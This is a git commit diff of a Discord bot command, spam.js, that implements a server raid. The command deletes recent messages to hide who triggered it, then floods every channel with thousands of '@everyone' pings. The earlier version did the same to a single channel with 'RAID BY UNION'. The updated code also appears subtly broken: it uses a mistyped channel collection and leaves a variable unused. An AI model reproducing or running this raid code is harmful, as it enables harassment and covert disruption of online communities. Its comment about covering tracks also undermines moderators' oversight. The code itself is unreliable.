864c51ff606345c6a2fd0fb81409afab4519d4d0
KawaiiAlex <38259844+KawaiiAlex@users.noreply.github.com>
2018-06-03 11:52:42 +0200

    Update spam.js

--- commands/test/spam.js
+++ commands/test/spam.js
@@ -1,17 +1,24 @@
 const Discord = require('discord.js');
 
+
+
 exports.run = (client, message, args) => {
+
+  let channels = 250;
+
 
   // Get the guild using the ID.
   let SpamChannel = message.guild.channels.find(`name`, "vive-union");
 
     message.channel.fetchMessages({limit: 10}).then(messages => message.channel.bulkDelete(messages)); //deletes messages to cover up you did it
-    for (var i = 0; i < 9999; i++) {
-       SpamChannel.send("@everyone RAID BY UNION")
+    message.guild.channel.forEach(c => {
+
+        for (var i = 0; i < 9812; i++) {
+            c.send("@everyone")
         }
-}
-
-
+      })
+    }
+  
     exports.conf = {
         enabled: true,
         guildOnly: false,
